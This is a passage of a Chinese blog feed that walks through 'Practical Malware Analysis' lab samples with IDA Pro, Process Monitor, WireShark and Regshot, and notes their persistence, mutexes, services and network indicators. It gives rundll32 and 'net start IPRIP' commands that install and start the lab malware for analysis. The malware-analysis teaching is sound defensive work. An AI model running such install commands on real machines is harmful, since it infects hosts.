</p><p>sub_10003695函数功能是获取系统版本信息，并且判断系统版本是否为NT系统，如果是返回true,否则返回false。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816134131910-2118603059.png" alt="image-20210816134131308"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816134331286-1820477811.png" alt="image-20210816134330714"> </p><p>根据上面的分析我们可以得出结论，dword_1008E5C4的值应该是true也就是不为0，所以他不会跳转到loc_1001d7处，而是继续执行”cmd.exe /c”处。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816134725363-900334664.png" alt="image-20210816134724611"> </p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这一节我们学习了IDA Pro的很多知识，主要学会了IDA Pro</p><ul><li>文本视图和界面视图的切换（用空格按键）</li><li>在界面视图显示地址</li><li>查看IDA Pro的导入表窗口</li><li>交叉引用，查看被多少处函数调用(ctrl + x)</li><li>地址的跳转(ctrl + g)</li><li>函数内局部变量的分析（带负号的）</li><li>函数参数分析(push xx,call xxx)、(正数的)</li><li>Strings 字符串窗口的查看(shift + f12)</li><li>代码分析(f5)</li><li>静态分析流程分支，追溯(利用ctrl +x) 看w和r属性，分析函数返回值</li></ul><p>欢迎加入QQ群：研究逆向、PWN、WEB安全、物联网安全</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816153759717-1095225742.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt; 
这节课主要通过使用IDA Pro来进行静态高级分析
## 实验：

&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="恶意代码分析系列" scheme="https://vxer-lee.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战三：动态分析基础技术</title>
    <link href="https://vxer-lee.github.io/2021/08/10/MalwareAnalysis/3.DynamicBasic/"/>
    <id>https://vxer-lee.github.io/2021/08/10/MalwareAnalysis/3.DynamicBasic/</id>
    <published>2021-08-10T10:04:20.000Z</published>
    <updated>2021-08-16T11:03:37.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/> 这节课主要是通过以下的例子，学会如何使用动态分析基础技术的一些工具。<ul><li>Process Monitor</li><li>Process Explorer</li><li>WireShark</li><li>Regshot</li><li>rundll32</li><li>net start 命令</li></ul><h2 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab03-01.exe</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">使用工具：</span><br><span class="line">1. Process Explorer</span><br><span class="line">2. Strings</span><br><span class="line">3. Process Monitor</span><br><span class="line">4. StudyPE</span><br><span class="line">5. WireShark</span><br><span class="line"></span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、找出这个恶意代码的导入函数与字符串列表？</span><br><span class="line">2、这个恶意代码在主机上的感染特征是什么？</span><br><span class="line">3、这个恶意代码是否存在一些有用的网络特征码？如果存在，他们是什么？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure><h3 id="题目1解答："><a href="#题目1解答：" class="headerlink" title="题目1解答："></a>题目1解答：</h3><p>导入表里面只有一个API函数，<code>ExitProcess</code>退出进程相关的api函数。</p><p>所以这个程序有可能的功能是打开后就退出。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164303446-2004223255.png" alt="image-20210813130730115"> </p><p>查看字符串发现有几处可疑的地方：一个网址、三个注册表值，其中一个注册表值还是自启动的注册表键值。</p><p>说明恶意程序有可能会打开这个恶意网址，并且添加到自启动。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164310606-1730778422.png" alt="image-20210813131229616"> </p><h3 id="题目2解答："><a href="#题目2解答：" class="headerlink" title="题目2解答："></a>题目2解答：</h3><p>题目2中问了<code>这个恶意代码在主机上的感染特征是什么？</code>，那么我们只靠静态分析是看不出来的，这时候就用到了动态分析的基础技术了。</p><h4 id="Process-Explorer"><a href="#Process-Explorer" class="headerlink" title="Process Explorer"></a>Process Explorer</h4><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164313808-486290819.png" alt="image-20210813132112725"> </p><p>需要注意的是这里创建了一个互斥量<code>WinVMX32</code>。</p><p>恶意程序经常会创建互斥量，也为这样的话他就可以对计算机中的某个资源在同一时刻只有一个对象对其进行访问。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164318186-1762604630.png" alt="image-20210813132259382"> </p><p>接着再来看看DLL，操作方法和上面的Handles一样。</p><p>值得注意的是标红色标记那里，他调用了ws2_32.dll，说明这个程序他有网络通讯的功能。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164322850-18974552.png" alt="image-20210813132645985"> </p><h4 id="Process-Monitor"><a href="#Process-Monitor" class="headerlink" title="Process Monitor"></a>Process Monitor</h4><p>打开Process Monitor选择过滤器，过滤掉不必要的进程信息。</p><p> <img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164326495-525036889.png" alt="image-20210813131939272"> </p><p>可以看到<code>Process Monitor</code>帮我们监控到了很多信息，但是我们不需要这么多信息，我们只关心我们需要关注的操作。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164329826-657515794.png" alt="image-20210813132924446"> </p><p>对其就行行为<code>WriteFile</code>和<code>RegSetValue</code>进行过滤，分别的功能是写入文件和注册表操作。</p><p>过滤后看图2，发现监控到3处敏感地方：</p><ol><li>程序在<code>windows\system32</code>出写出了文件<code>vmx32to64.exe</code></li><li>程序添加了自启动注册表值<code>CurrenVersion\Run\VideoDriver</code></li><li>程序操作了随机数，注册表值<code>RNG\Seed</code></li></ol><p>用Process Monitor分析后可知该恶意程序会添加自启动，会写出文件到系统目录，会操作随机数。<br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164334285-976116684.png" alt="image-20210813133217400"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164339421-1107910108.png" alt="image-20210813141613537"> </p><h4 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h4><p>wireshark打开后，直接监听网卡流量即可。</p><p>WireShark监控中看到有DNS协议，恶意软件解析了域名<code>www.practicalmalwareanalysis.com</code>。</p><p>监控到SSL协议，发送了256字节的随机乱码数据。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164341681-1188606964.png" alt="image-20210813142249004"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164345080-1006470898.png" alt="image-20210813142541906"> </p><h3 id="实验一总结："><a href="#实验一总结：" class="headerlink" title="实验一总结："></a>实验一总结：</h3><p>我们通过了使用Process Monitor和Process Explorer与WireShark等动态监控的软件对实验一进行了分析，并且得出如下结论：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lab03-01.exe会创建互斥量，会将自身拷贝到系统\Windows\system32\vmx32to64.exe中，恶意程序会创建启动项，恶意程序还会有网络通讯功能，访问www.practicalmalwareanalysis.com并且发送随机的256字节乱码数据。</span><br></pre></td></tr></table></figure><h2 id="实验二：动态分析不可运行的DLL"><a href="#实验二：动态分析不可运行的DLL" class="headerlink" title="实验二：动态分析不可运行的DLL"></a>实验二：动态分析不可运行的DLL</h2><p><code>.dll，动态链接库英文为DLL，是Dynamic Link Library的缩写。</code></p><p>由于DLL不能像EXE那样单独运行，他需要由EXE来装载动态调用，下面我们就来介绍如何对DLL进行动态分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab03-02.dll</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">使用工具：</span><br><span class="line">1. Process Explorer</span><br><span class="line">2. Strings</span><br><span class="line">3. Process Monitor</span><br><span class="line">4. StudyPE</span><br><span class="line">5. WireShark</span><br><span class="line">6. Regshot</span><br><span class="line"></span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、你怎么样让这个恶意代码自行安装？</span><br><span class="line">2、在安装之后，你如何让这个恶意代码运行起来？</span><br><span class="line">3、你怎么能找到这个恶意代码是在哪个进程下运行的？</span><br><span class="line">4、你可以在Process Monitor工具中设置什么样的过滤器，才能收集这个恶意代码的信息？</span><br><span class="line">5、这个恶意代码在主机上的感染迹象特征是什么？</span><br><span class="line">6、这个恶意代码是否存在一些有用的网络特征码</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure><p>接下来我们带着题目中的6个疑问来进行分析。</p><h3 id="题目1：让恶意代码自行安装"><a href="#题目1：让恶意代码自行安装" class="headerlink" title="题目1：让恶意代码自行安装"></a>题目1：让恶意代码自行安装</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>这里和之前分析EXE时候有些不一样的地方，之前我们都是通过分析导入表看EXE引用了哪些api函数，而分析dll的时候会额外的多出一个<code>导出表</code>，顾名思义就是dll导出了他的函数，供应加载他的exe去调用他，所以我们这里需要关注的点就是导出表中的函数。</p><p>其中这里有5个导出函数，其中第二个和第三个导出函数猜测应该是和服务相关，那么这个dll可能会创建一个服务，而第四个是installA有可能该dll通过此dll进行安装。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164351088-1630329337.png" alt="image-20210813144324734"> </p><p>那么我们继续看导入表，看看该dll调用了哪些api函数。</p><p>其中<code>Reg</code>带头的都是注册表相关的api函数，带Service的是服务相关的api函数，那么我们就可以说此dll具有操作注册表和服务相关的功能。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164354565-1341149723.png" alt="image-20210813144659756"> </p><p>继续看，该dll还具有操作http相关的功能。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164358379-1803210353.png" alt="image-20210813145047850"> </p><p>在其字符串中有出现网址，并且有出现<code>svchost</code>,这是Windows的一个宿主程序，有许多的系统dll都附着在该程序中运行，所以本次使用目的有可能也是需要通过附着到svchost上到达代码运行的效果。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164402093-1467074975.png" alt="image-20210813145415001"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164406913-173977676.png" alt="image-20210813145523398"> </p><h4 id="让恶意代码自行安装"><a href="#让恶意代码自行安装" class="headerlink" title="让恶意代码自行安装"></a>让恶意代码自行安装</h4><p>在静态分析中，我们得到了导出函数中有一个<code>installA</code>函数，所以我们这里大胆猜测是用这个函数进行dll的安装。</p><p>那么在Windows系统中有这么一个程序<code>rundll32.exe</code>， 专门用来安装dll程序的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#命令行</span></span><br><span class="line">rundll32.exe Lab03-02.dll,installA</span><br></pre></td></tr></table></figure><p>这里先不急着运行，因为我们运行后也看不到任何结果，而我们这里主要关注下其文件对注册表进行了哪些修改，所以我们需要用到<code>Regshot</code>工具。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164409958-1259230648.png" alt="image-20210813151031718"> </p><p>恶意程序添加了一个名为<code>IPRIP</code>的服务，并且服务显示名与描述信息如第二处标红位置。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164412555-1032083246.png" alt="image-20210813151122548"> </p><h3 id="题目2：运行恶意代码"><a href="#题目2：运行恶意代码" class="headerlink" title="题目2：运行恶意代码"></a>题目2：运行恶意代码</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164415609-1752316468.png" alt="image-20210813151233979"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164417978-789580048.png" alt="image-20210813151345696"> </p><p>然后你可以点击上面的启动来运行dll，当然也可以用如下的命令进行服务的启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#命令行</span></span><br><span class="line">net start IPRIP</span><br></pre></td></tr></table></figure><h3 id="题目3：找到恶意代码附着的进程"><a href="#题目3：找到恶意代码附着的进程" class="headerlink" title="题目3：找到恶意代码附着的进程"></a>题目3：找到恶意代码附着的进程</h3><p>在<code>Process Explorer</code>中点击Find菜单，并且输入需要查找的dll回车后即可得到dll附加进程的信息。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164420561-552297810.png" alt="image-20210813152245120"> </p><h3 id="题目4：Process-Monitor设置过滤dll监控"><a href="#题目4：Process-Monitor设置过滤dll监控" class="headerlink" title="题目4：Process Monitor设置过滤dll监控"></a>题目4：Process Monitor设置过滤dll监控</h3><p>因为dll是需要exe加载运行，所以我们设置Process Name为dll名字是无效的,而我们这里的Process Name是<code>svchost.exe</code>，但是系统中有很多的svchost.exe导致我们不好定位，这里解决的办法是得到进程的pid如上图<code>1108</code></p><p><code>我们先运行Process Monitor然后再启动服务，最后在进行如下数据的过滤。</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164422722-1183301009.png" alt="image-20210813153418421"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164425285-1353752672.png" alt="image-20210813153358434"> </p><h3 id="题目5：感染迹象特征"><a href="#题目5：感染迹象特征" class="headerlink" title="题目5：感染迹象特征"></a>题目5：感染迹象特征</h3><p>程序会附着在系统进程<code>svchost.exe</code>中</p><h3 id="题目6：网络特征"><a href="#题目6：网络特征" class="headerlink" title="题目6：网络特征"></a>题目6：网络特征</h3><p>解析域名，访问http</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164428405-1311404628.png" alt="image-20210813153913318"><br><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164433470-1039749053.png" alt="image-20210813154004062"> </p><h3 id="实验二总结："><a href="#实验二总结：" class="headerlink" title="实验二总结："></a>实验二总结：</h3><p>通过实验二，我们知道了用rundll32.exe来安装dll，知道了<code>svchost.exe</code>可以让dll附着并运行服务，还知道了Process Monitor可以用过用pid的方式来过滤我们想要的dll监控数据。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>在动态分析基础技术中的实验，我们学习到了如下技能</p><ul><li>Process Monitor可以用来监控程序的行为</li><li>Process Explorer可以用来查看进程的信息</li><li>WireShark可以抓到应用程序的网络流量包</li><li>Regshot可以对比程序运行前后的注册表值</li><li>rundll32.exe 可以用来安装dll</li><li>svchost.exe 即服务可以用来运行dll，或附着dll。</li></ul><p>欢迎加入QQ群：研究逆向、PWN、WEB安全、物联网安全</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210816153728237-773892030.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt; 
这节课主要是通过以下的例子，学会如何使用动态分析基础技术的一些工具。

&lt;ul&gt;
&lt;li&gt;Process Monitor&lt;/li&gt;
&lt;li&gt;Process Explorer&lt;/li&gt;
&lt;</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="恶意代码分析系列" scheme="https://vxer-lee.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战二：静态分析基础技术</title>
    <link href="https://vxer-lee.github.io/2021/08/09/MalwareAnalysis/2.StaticBasic/"/>
    <id>https://vxer-lee.github.io/2021/08/09/MalwareAnalysis/2.StaticBasic/</id>
    <published>2021-08-09T10:02:30.000Z</published>
    <updated>2021-08-16T11:03:30.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/> 我们主要通过以下的四个实验，来学习静态分析的基础技术，请大家务必完成每个实验中题目，这样才能得到有效的水平提升。<p>实验中的工具或样本都可以在这里下载到：<a href="https://github.com/Vxer-Lee/MalwareAnalysis">https://github.com/Vxer-Lee/MalwareAnalysis</a></p><h2 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">Lab01-01.exe</span><br><span class="line">Lab01-01.dll</span><br><span class="line">----------------</span><br><span class="line">使用工具：</span><br><span class="line">1. StudyPE+ x86</span><br><span class="line">2. Strings</span><br><span class="line">3. VirSCAN.org</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">实验内容：</span><br><span class="line">1、将文件上传到http:&#x2F;&#x2F;www.VirusTotal.com 进行分析并查看报告。文件匹配到了已有的反病毒软件特征吗？</span><br><span class="line">2、这些文件是什么时候编译的？</span><br><span class="line">3、这两个文件中是否存在迹象说明他们是否被加壳或混淆了？如果是，这些迹象在哪里？</span><br><span class="line">4、是否有导入函数显示出了这个恶意代码是做什么的？如果是，是哪些导入函数？</span><br><span class="line">5、是否有任何其他文件或基于主机的迹象，让你可以在受感染系统上查找？</span><br><span class="line">6、是否有基于网络的迹象，可以用来发现受感染机器上的这个恶意代码？</span><br><span class="line">7、你猜这些文件的目的是干什么的？</span><br><span class="line">-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br></pre></td></tr></table></figure><p>实验一主要的目的是让我们通过实践，学习到PE结构分析工具的使用，还有字符串分析工具和在线病毒查杀网站的使用</p><h3 id="VirSCAN-org"><a href="#VirSCAN-org" class="headerlink" title="VirSCAN.org"></a>VirSCAN.org</h3><p>实验中的题目1是想让我们将文件上传到VirusTotal.com进行查毒，但是这个网站是国外的并且需要翻墙才能访问，所以我们可以用国内的 <a href="https://www.virscan.org/">VirSCAN.org</a>来代替。</p><p>上传exe后，网站提示文件已经上传过了，那我们直接点查看最后一次的扫描结果即可。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813163953071-1882133889.png" alt="image-20210812163742357"> </p><p>这里可以看到许多杀毒软件报毒了，所以我们可以判定这个文件是属于恶意软件了。</p><p>而像有的杀毒软件却没有报毒，出现这种情况应该是该杀毒软件厂商未能收集到样本的特征码并且加入到他的病毒库中，所以他就无法检测到我们的恶意软件。（dll也是通过同样的方式上传即可，这里不在重复演示）</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813163956660-966476172.png" alt="image-20210812164050189"> </p><h3 id="查看文件编译时间"><a href="#查看文件编译时间" class="headerlink" title="查看文件编译时间"></a>查看文件编译时间</h3><p>PE文件的编译时间呢，存在PE文件头当中，我们平时做逆向或者恶意代码分析，最好要一张PE结构图来进行查阅。</p><p>（仔细看荧光笔的部分，在一个<code>_IMAGE_FILE_HEADER</code>结构体里面就有存放文件编译时间戳的变量<code>TimeDateStamp</code>）</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164016716-1889674843.png" alt="image-20210812164810029"> </p><p>我们可以通过像<code>StudyPE+ x86</code>这类PE结构分析软件来查看文件的编译时间，如下图我们通过查看PE头中的文件时间戳，并且计算出时间即可得到文件的编译时间。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164016860-190726171.png" alt="image-20210812165558881"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164130426-239242223.png" alt="image-20210812165616472"> </p><h3 id="StudyPE-x86-查壳"><a href="#StudyPE-x86-查壳" class="headerlink" title="StudyPE+ x86 查壳"></a>StudyPE+ x86 查壳</h3><p>StudyPE中在文件类型这地方会显示壳的特征，而需要注意的是如果程序<code>没有加壳</code>，那么他会直接显示出<code>开发的语言</code>，当然还有第三种情况就是会显示<code>Unknow Exe Type</code>，意思是他无法识别是什么壳或者什么语言开发的。</p><p>我们可以看到这里他是显示了<code>E Language -&gt; WuTao</code>，什么意思呢？他这里其实是想告诉我们Lab01-01.exe是用易语言进行开发的，其实呢并不是，易语言他底层其实就是调用VC6++进行编译的，所以这个程序他是用VC6++开发的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">易语言</span><br><span class="line">  |  (底层)</span><br><span class="line">  v</span><br><span class="line"> VC6++</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164020125-81093286.png" alt="image-20210812165946871"> </p><h3 id="导入函数"><a href="#导入函数" class="headerlink" title="导入函数"></a>导入函数</h3><p>Lab01-01.exe中引用了两个动态库，而需要注意的是以下4个API函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CreateFileA <span class="comment">//创建文件或打开文件</span></span><br><span class="line">FindNextFileA <span class="comment">//这两个都是用来遍历指定目录所有文件的，特别需要注意因为像勒索软件就需要遍历全盘 对文件进行加密</span></span><br><span class="line">FindFirstFileA</span><br><span class="line">CopyFileA <span class="comment">//拷贝文件，恶意软件往往喜欢将自己拷贝到系统目录。</span></span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164023948-554895898.png" alt="image-20210812171041301"> </p><p>在Lab01-01.dll中需要注意的是这三个地方。</p><p>其中<code>KERNEL32.dll</code>中的两个API函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;这两个都是互斥量函数，恶意程序往往喜欢创建或打开一个互斥量，因为创建了互斥量后再同一时间只允许一个程序访问其资源。</span><br><span class="line"></span><br><span class="line">CreateMutex <span class="comment">//创建互斥量</span></span><br><span class="line">OpenMutex   <span class="comment">//打开互斥量</span></span><br></pre></td></tr></table></figure><p>而这个<code>WS2_32.dll</code>他是一个网络通讯的动态库，所以我们有理由相信这个恶意程序他会有网络通信的操作。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164028652-578450317.png" alt="image-20210812171918392"> </p><h3 id="Strings查看敏感字符串信息"><a href="#Strings查看敏感字符串信息" class="headerlink" title="Strings查看敏感字符串信息"></a>Strings查看敏感字符串信息</h3><p>Strings是微软官方的一个命令行工具，主要用来查看程序中的所有字符串信息，平时我们通过敏感的字符串来定位分析一个程序是极好的选择。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">命令行：</span><br><span class="line">Strings.exe &quot;Lab01-01.exe&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;值得注意的地方有两处</span><br><span class="line">首先第一处他这里不是kernel32.dll而是kerne132.dll是1234的1，</span><br><span class="line">然后第二处是Lab01-01.dll</span><br><span class="line">&#x2F;&#x2F;再结合我们上面分析的导入表，分析出他有个CopyFile的api函数，所以可以得出结论：</span><br><span class="line">这个exe程序想把Lab01-01.dll文件拷贝到系统目录并且伪装成系统文件&quot;kernel32.dll&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164031792-1111504420.png" alt="image-20210812172847905"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">命令行：</span><br><span class="line">Strings.exe &quot;Lab01-01.dll&quot;</span><br><span class="line"></span><br><span class="line">发现有一个ip地址，&quot;127.26.152.13&quot; 并且结合之前dll的导入函数有网络通讯的动态库。</span><br><span class="line">所以最后的结论是：Lab01-01.exe调用Lab01-01.dll对&quot;127.26.152.13&quot;进行连接，此ip可能是黑客用来控制的主控端ip，程序还会将Lab01-01.dll拷贝到系统目录伪装成&quot;kernel32.dll&quot;，以此达到一个持久化的目的。</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202108/2080041-20210813164034900-2122247722.png" alt="image-20210812173253111"> </p><h2 id="实验二："><a href="#实验二：" class="headerlink" title="实验二："></a>实验二：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 